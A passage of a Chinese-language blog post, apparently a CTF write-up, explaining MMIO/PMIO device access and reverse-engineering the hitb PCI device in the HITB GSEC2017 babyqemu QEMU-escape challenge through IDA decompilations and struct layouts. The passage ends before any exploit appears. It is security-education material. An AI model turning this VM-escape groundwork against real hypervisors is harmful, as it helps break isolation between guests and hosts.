class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><h3 id="pmio"><a href="#pmio" class="headerlink" title="pmio"></a>pmio</h3><p>端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio.png"                      alt="pmio"                ></p><ul><li>  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O</li><li>  Bit 1：Reserved</li><li>  Bits 31-2：Base Address，以 4 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio_layout.png"                      alt="pmio_layout"                ></p><p><strong>访问pmio代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h3><p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204154525744.png"                      alt="image-20230204154525744"                ></p><p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155149832.png"                      alt="image-20230204155149832"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155333889.png"                      alt="image-20230204155333889"                ></p><p>每个设备的目录下<code>resource0</code> 对应MMIO空间。<code>resource1</code> 对应PMIO空间。<br>resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。</p><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><p><del>因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！</del></p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先注意的是加载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/<span class="built_in">local</span>/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure><p>这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。</p><p>那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204162747766.png"                      alt="image-20230204162747766"                ></p><p>首先则是先观察init函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">         <span class="number">469</span>,</span><br><span class="line">         <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  BYTE4(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">16</span>;</span><br><span class="line">  HIWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">2</span>].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">4660</span>;</span><br><span class="line">  WORD1(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在init初始化函数，需要将设备类型定义为PCIDeviceClass结构体。PCIDeviceClass结构体在Local type中可以找到它的描述定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DeviceClass_0 parent_class;</span><br><span class="line">  <span class="keyword">void</span> (*realize)(PCIDevice_0 *, Error_0 **);    <span class="comment">//0xc0</span></span><br><span class="line">  <span class="keyword">int</span> (*init)(PCIDevice_0 *);</span><br><span class="line">  PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">  PCIConfigReadFunc *config_read;</span><br><span class="line">  PCIConfigWriteFunc *config_write;</span><br><span class="line">  <span class="keyword">uint16_t</span> vendor_id;    <span class="comment">//0xe8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> device_id;    <span class="comment">//0xea</span></span><br><span class="line">  <span class="keyword">uint8_t</span> revision;</span><br><span class="line">  <span class="keyword">uint16_t</span> class_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_vendor_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_id;</span><br><span class="line">  <span class="keyword">int</span> is_bridge;</span><br><span class="line">  <span class="keyword">int</span> is_express;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *romfile;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里手动添加一下结构体再修改init函数中的变量定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> PCIDeviceClass struc ; (<span class="keyword">sizeof</span>=<span class="number">0x108</span>, align=<span class="number">0x8</span>, copyof_1371)</span><br><span class="line"><span class="number">00000000</span> parent_class DeviceClass_0 ?</span><br><span class="line"><span class="number">000000</span>C0 realize dq ?                            ; offset</span><br><span class="line"><span class="number">000000</span>C8 init dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D0 <span class="built_in">exit</span> dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D8 config_read dq ?                        ; offset</span><br><span class="line"><span class="number">000000E0</span> config_write dq ?                       ; offset</span><br><span class="line"><span class="number">000000E8</span> vendor_id dw ?</span><br><span class="line"><span class="number">000000</span>EA device_id dw ?</span><br><span class="line"><span class="number">000000</span>EC revision db ?</span><br><span class="line"><span class="number">000000</span>ED db ? ; undefined</span><br><span class="line"><span class="number">000000</span>EE class_id dw ?</span><br><span class="line"><span class="number">000000F</span>0 subsystem_vendor_id dw ?</span><br><span class="line"><span class="number">000000F</span>2 subsystem_id dw ?</span><br><span class="line"><span class="number">000000F</span>4 is_bridge dd ?</span><br><span class="line"><span class="number">000000F</span>8 is_express dd ?</span><br><span class="line"><span class="number">000000F</span>C db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>D db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>E db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>F db ? ; undefined</span><br><span class="line"><span class="number">00000100</span> romfile dq ?                            ; offset</span><br><span class="line"><span class="number">00000108</span> PCIDeviceClass ends</span><br><span class="line"><span class="number">00000108</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到设备号device_id=0x2333，功能号vendor_id=0x1234</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci -v</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /sys/bus/pci/devices/0000\:00\:04.0/</span></span><br><span class="line">broken_parity_status      firmware_node             rescan</span><br><span class="line">class                     irq                       resource</span><br><span class="line">config                    local_cpulist             resource0</span><br><span class="line">consistent_dma_mask_bits  local_cpus                subsystem</span><br><span class="line">d3cold_allowed            modalias                  subsystem_device</span><br><span class="line">device                    msi_bus                   subsystem_vendor</span><br><span class="line">dma_mask_bits             numa_node                 uevent</span><br><span class="line">driver_override           power                     vendor</span><br><span class="line"><span class="built_in">enable</span>                    remove</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>resource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。</p><p>其次分析注册的函数，通过<code>pci_hitb_realize</code>函数查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到在<code>timer_init_tl</code>函数是将<code>hitb_dma_timer</code>作为回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">timer_init_tl</span><span class="params">(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, <span class="keyword">int</span> scale, QEMUTimerCB *cb, <span class="keyword">void</span> *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ts-&gt;timer_list = timer_list;</span><br><span class="line">  ts-&gt;cb = cb;</span><br><span class="line">  ts-&gt;opaque = opaque;</span><br><span class="line">  ts-&gt;scale = scale;</span><br><span class="line">  ts-&gt;expire_time = <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在下面注册了<code>hitb_mmio_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">40</span> <span class="number">44</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A0 <span class="number">41</span>+hitb_mmio_ops dq offset hitb_mmio_read                ; read</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; DATA XREF: pci_hitb_realize+<span class="number">99</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset hitb_mmio_write               ; write</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以这里需要重点注意的也就是这样三个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hitb_mmio_read</span><br><span class="line">hitb_mmio_write</span><br><span class="line">hitb_dma_timer</span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><p>在分析函数之前还需要搞懂设备结构体，具体可以在view-&gt;Open Subviews-&gt;Local Type(shift + F1)中搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="keyword">bool</span> stopping;</span><br><span class="line">  <span class="keyword">uint32_t</span> addr4;</span><br><span class="line">  <span class="keyword">uint32_t</span> fact;</span><br><span class="line">  <span class="keyword">uint32_t</span> status;</span><br><span class="line">  <span class="keyword">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="keyword">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">void</span> (*enc)(<span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">uint64_t</span> dma_mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> src;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> dst;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0x10000ED</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>size == 4</code>才能读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 